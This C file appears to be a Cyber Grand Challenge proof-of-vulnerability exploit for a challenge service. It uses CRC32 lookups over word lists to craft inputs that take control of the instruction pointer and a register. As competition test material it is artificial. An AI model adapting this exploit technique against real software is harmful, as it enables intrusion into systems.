/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#include <libpov.h>
#include "crc32.h"
#include "adjectives_list.h"
#include "adverbs_list.h"
#include "verbs_list.h"
#include "nouns_list.h"

unsigned int adj[4096];
unsigned int noun[4096];
unsigned int adv[4096];
unsigned int verb[4096];

void *calloc(size_t s) {
    void *p = malloc(s);
    if (!p)
        return NULL;
    memset(p, '\0', s);
    return p;
}

char * strcat(char *dest, const char *src) {
    char *res = dest;

    while(*dest++);

    dest--;

    while(*src)
        *dest++ = *src++;

    *dest='\0';

    return res;
}

void itoa(unsigned int n, char *s) {
    int i = 0;
    unsigned int orig = n;
    do {
        i++;
    } while ((n /= 10 ) > 0);

    s[i] = '\n';
    s[i+1] = '\0';
    n = orig;

    do {
        s[--i] = n % 10 + '0';
    } while ((n /= 10 ) > 0);
}

int streq(char *s1, char *s2) {
    while (*s1++ == *s2++ && (*(s1-1)));

    return (*(s1-1) == *(s2-1));
}

void build_crc_map(unsigned int *c, char **list) {
    int i;

    for (i=0; i < 4096; i++) {
        c[i] = crc32(list[i],strlen(list[i]));
    }
}

unsigned int find_needed_str(unsigned int *c, unsigned char b) {
    int i;
    for (i = 0; i < 4096; i++) {
        if (((c[i]>>24)&0xff) == b)
            return i;
    }
    return 0xffffffff;
}

int main(void) {
   unsigned char *temp;
   char num[13] = {0};
   unsigned int size = 256;
   unsigned int indexes[4] = {0};
   unsigned int * van[] = {verb, adj, noun};
   unsigned int * nvn[] = {noun, verb, noun};
   unsigned int * vna[] = {verb, noun, adv};
   unsigned int * nva[] = {noun, verb, adv};
   int i;
   static unsigned char delim[] = "\x0a";
   char *setup = "blah\n1\n0\n";

   build_crc_map(adj, adjectives_list);
   build_crc_map(adv, adverbs_list);
   build_crc_map(verb, verbs_list);
   build_crc_map(noun, nouns_list);

   type1_vals t1vals;
   type1_negotiate(0x00ffffff, 0xffffff00, 1, &t1vals);

   transmit_all(0, setup, strlen(setup));

   itoa(0x80000000|(t1vals.ipval&0x00ffffff), num);
   transmit_all(0, num, strlen(num));

   //we want "secure" mode
   transmit_all(0, "1\n", 2);

   //now we calc the rest of the bits we need
   for (i = 1; i < 4; i++) {
       if ((indexes[i] = find_needed_str(van[i-1], t1vals.regval>>(8*i)&0xff)) > 4096)
           goto noun_verb_noun;
   }
   indexes[0] = 0;
   goto done;
noun_verb_noun:
   for (i = 1; i < 4; i++) {
       if ((indexes[i] = find_needed_str(nvn[i-1], t1vals.regval>>(8*i)&0xff)) > 4096)
           goto verb_noun_adv;
   }
   indexes[0] = 1;
   goto done;

   //failed with default, try this 
verb_noun_adv:
   for (i = 1; i < 4; i++) {
       if ((indexes[i] = find_needed_str(vna[i-1], t1vals.regval>>(8*i)&0xff)) > 4096)
          goto noun_verb_adv;
   }
   indexes[0] = 2;
   goto done;

noun_verb_adv:
   for (i = 1; i < 4; i++) {
       if ((indexes[i] = find_needed_str(nva[i-1], t1vals.regval>>(8*i)&0xff)) > 4096)
          return 10; //shouldn't happen?
   }
   indexes[0] = 3;

done:
   for (i = 0; i < 4; i++) {
       itoa(indexes[i], num);
       transmit_all(0, num, strlen(num));
   }

    while(1) {
        delimited_read(0, &temp, &size, delim, 1);
        if(!temp)
            break;
        if (streq((char*)temp,"Thanks for waiting! Here is your password file. Welcome!"))
            break;
        size = 256;
    }
}
